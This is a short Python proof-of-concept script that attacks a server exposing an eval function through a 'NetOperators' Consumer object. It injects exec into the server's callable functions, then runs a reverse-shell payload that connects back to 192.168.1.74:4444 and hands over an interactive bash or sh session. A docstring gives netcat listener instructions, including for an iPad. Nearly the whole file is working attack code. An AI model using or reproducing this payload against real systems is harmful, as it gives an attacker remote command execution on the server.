from NetOperators import Consumer
"""
Showing an exploit if the server enabled the eval function. This opens a reverse shell on port 4444.
To use the reverse shell, run on a terminal: nc -lvnp 4444
btw: on the ipad, you can use a-shell to run the reverse shell with nc -l 4444. for the ip, run ifconfig | grep 192.168
or grep inet
"""
c = Consumer("test")
c.eval("self.functions.update({'exec': exec})")
print(c.list())
c.functions = set(c.list())
payload = """import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('192.168.1.74',4444));
subprocess.Popen([next(filter(os.path.exists,['/bin/bash','/bin/sh']),'-i')],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno());
""".strip()
c.exec(payload)

